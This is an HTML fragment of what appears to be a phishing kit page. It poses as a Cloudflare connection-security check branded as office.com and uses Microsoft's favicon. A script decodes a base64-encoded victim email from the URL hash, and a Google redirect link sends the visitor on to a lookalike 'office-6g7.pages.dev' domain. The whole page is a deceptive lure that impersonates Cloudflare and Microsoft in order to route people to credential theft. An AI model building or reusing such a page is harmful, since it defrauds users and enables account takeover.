<html lang="en-US">
  ...
  if (hash) {
    const email = atob(hash); // Decode the base64-encoded email
    return email;
  }
  return '';
}
...
var url = "https://www.google.com/url?q=https%3A%2F%2F85e14135.office-6g7.pages.dev%2F&sa=D&sntz=1&usg=AOvVaw1gdy6IxqguyA2fiTU2PPlV#";
      ...
      <div class="main-wrapper" role="main">
         <div class="main-content">
            <h1 class="zone-name-title h1">
               <img class="heading-favicon" src="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" onerror="this.onerror=null;this.parentNode.removeChild(this)"> office.com
            </h1>
            <h2 class="h2" id="cf-challenge-running"> Checking if the site connection is secure </h2>
            ...
            <div id="challenge-success" style="display: none;">
               <div class="h2">
                  ...
                  </span> &nbsp; Connection is secure
               </div>
               <div class="core-msg spacer">Proceeding...</div>
            </div>
            <div id="challenge-all">
               <div id="cf-challenge-body-text" class="core-msg spacer"> office.com needs to review the security of your connection before proceeding. </div>
               <div id="challenge-fact-wrapper" class="fact spacer hidden" style="display: block; visibility: visible;">
                  ...
                  <span id="challenge-fact" class="body-text"> that Cloudflare mitigates an average of 72 billion cyber threats, including DDoS attacks, per day?</span>
               </div>
               <div id="challenge-explainer-expandable" class="hidden expandable body-text spacer" style="display: block; visibility: visible;">
                  ...
                  <div class="expandable-details" id="challenge-explainer-details"> Requests from malicious bots can pose as legitimate traffic. Occasionally, you may see this page while the site ensures that the connection is secure.</div>
               </div>
            </div>
         </div>
      </div>
      <div class="footer" role="contentinfo">
         <div class="footer-inner">
            <div class="clearfix diagnostic-wrapper">
               <div class="ray-id">Ray ID: <code id="ray-code">4922deb1-ffc3-4e66-8910-1a9575357a19</code>
               </div>
            </div>
            <div class="text-center"> Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=l" target="_blank">Cloudflare</a>
            </div>
         </div>
      </div>
